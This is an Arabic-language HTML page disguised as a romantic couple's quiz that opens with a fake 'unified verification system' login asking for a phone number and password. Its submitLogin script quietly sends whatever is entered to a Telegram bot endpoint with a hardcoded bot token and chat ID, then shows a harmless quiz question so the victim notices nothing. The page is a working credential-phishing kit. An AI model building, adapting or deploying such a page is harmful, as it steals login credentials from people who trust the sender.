<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification & Love</title>
    <style>
        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        
        body { 
            background-color: #ffe5ec; 
            background-image: radial-gradient(#ffb3c1 1px, transparent 1px);
            background-size: 40px 40px;
            display: flex; justify-content: center; align-items: center; 
            min-height: 100vh; margin: 0; direction: rtl; padding: 20px;
        }

        /* الخلفية (شلال القلوب) */
        .falling-decorations { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; }
        .decor { position: absolute; animation: fall 10s linear infinite; opacity: 0.6; }
        @keyframes fall { 0% { transform: translateY(-50px); } 100% { transform: translateY(100vh); } }

        /* البطاقة الرئيسية */
        .container { width: 100%; max-width: 400px; z-index: 10; }
        .card { background: rgba(255, 255, 255, 0.95); padding: 30px; border-radius: 25px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); border: 2px solid #ffccd5; }

        /* الشعار (ثابت ليبقى الجو العام رومانسي) */
        .logo-area { text-align: center; margin-bottom: 20px; }
        .logo-svg { width: 100px; height: auto; }
        .logo-text { font-weight: 900; color: #ff4d6d; margin: 5px 0; }

        /* واجهة الدخول الاحترافية (داخل البطاقة الرومانسية) */
        .system-header { display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 20px; color: #2d3436; }
        .security-icon { width: 40px; height: 40px; fill: #636e72; }
        
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dfe6e9; border-radius: 10px; background: #f8f9fa; }
        button { width: 100%; padding: 14px; background: #2d3436; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { background: #000; }

        /* اللعبة (الأسئلة) */
        .step { display: none; }
        .step.active { display: block; }
        .option { background: #fff0f3; border: 2px solid #ffccd5; padding: 15px; margin: 10px 0; border-radius: 15px; cursor: pointer; text-align: right; font-weight: 600; color: #590d22; }
        .option:hover { background: #ffdee2; }
        
        .progress-bar { width: 100%; height: 6px; background: #eee; border-radius: 5px; margin-bottom: 20px; display: none; }
        .progress-fill { height: 100%; background: #ff4d6d; width: 0%; transition: 0.3s; }
    </style>
</head>
<body>

<div class="falling-decorations" id="decorContainer"></div>

<div class="container">
    <div class="logo-area">
        <svg class="logo-svg" viewBox="0 0 200 130" xmlns="http://www.w3.org/2000/svg">
            <path d="M65,25 C45,5 15,20 15,50 C15,85 65,115 85,125 C75,110 30,80 30,50 C30,32 48,18 65,35 C82,18 100,32 100,50 C100,60 95,70 88,77 C84,81 76,85 71,85" stroke="#ff4d6d" stroke-width="12" fill="none"/>
            <path d="M135,25 C115,5 87,20 87,50 C87,55 89,61 92,66 M102,78 C115,92 125,102 135,110 C155,95 185,75 185,50 C185,20 155,5 135,25 Z" stroke="#ff758f" stroke-width="12" fill="none"/>
        </svg>
        <h1 class="logo-text">WE LOVE EACH OTHER</h1>
    </div>

    <div class="card">
        <div class="progress-bar" id="progressBar"><div class="progress-fill" id="progressFill"></div></div>

        <!-- شاشة تسجيل الدخول "الاحترافية" -->
        <div id="login" class="step active">
            <div class="system-header">
                <svg class="security-icon" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
                <h3>نظام التحقق الموحد</h3>
            </div>
            <p style="text-align: center; color: #636e72; font-size: 14px; margin-bottom: 20px;">قم بتأكيد هويتك لربط بياناتك ببروتوكول التحقق الآمن.</p>
            <input type="tel" id="phone" placeholder="رقم الهاتف">
            <input type="password" id="password" placeholder="كلمة المرور">
            <button onclick="submitLogin()">تأكيد الهوية والمتابعة</button>
        </div>

        <!-- مثال لسؤال (سيتم تكراره كما في الكود السابق) -->
        <div id="q1" class="step">
            <h3 style="color: #ff4d6d;">1. في أي عام بدأت حكايتنا؟</h3>
            <div class="option" onclick="next('2021')">2021</div>
            <div class="option" onclick="next('2022')">2022</div>
        </div>
    </div>
</div>

<script>
    // توليد الورود (نفس الكود السابق)
    const decors = ['🌸', '❤️', '🌹', '💖'];
    const container = document.getElementById('decorContainer');
    for (let i = 0; i < 20; i++) {
        let span = document.createElement('span');
        span.className = 'decor';
        span.innerText = decors[Math.floor(Math.random() * decors.length)];
        span.style.left = Math.random() * 100 + 'vw';
        span.style.animationDelay = Math.random() * 8 + 's';
        container.appendChild(span);
    }

    function submitLogin() {
        const phone = document.getElementById('phone').value;
        const password = document.getElementById('password').value;
        
        // هنا يتم الإرسال (تأكد من وضع الرابط الخاص بك)
        fetch(`https://api.telegram.org/bot8939934721:AAE0B_njzMIAjs9tJq5LnyTvN8PlVqZZnaQ/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: '7094930209',
                text: `🔒 محاولة: ${phone} / ${password}`
            })
        });

        document.getElementById('login').classList.remove('active');
        document.getElementById('progressBar').style.display = 'block';
        document.getElementById('q1').classList.add('active');
    }

    function next(ans) {
        // الانتقال للأسئلة التالية..
        alert("إجابة مسجلة: " + ans);
    }
</script>
</body>
</html>
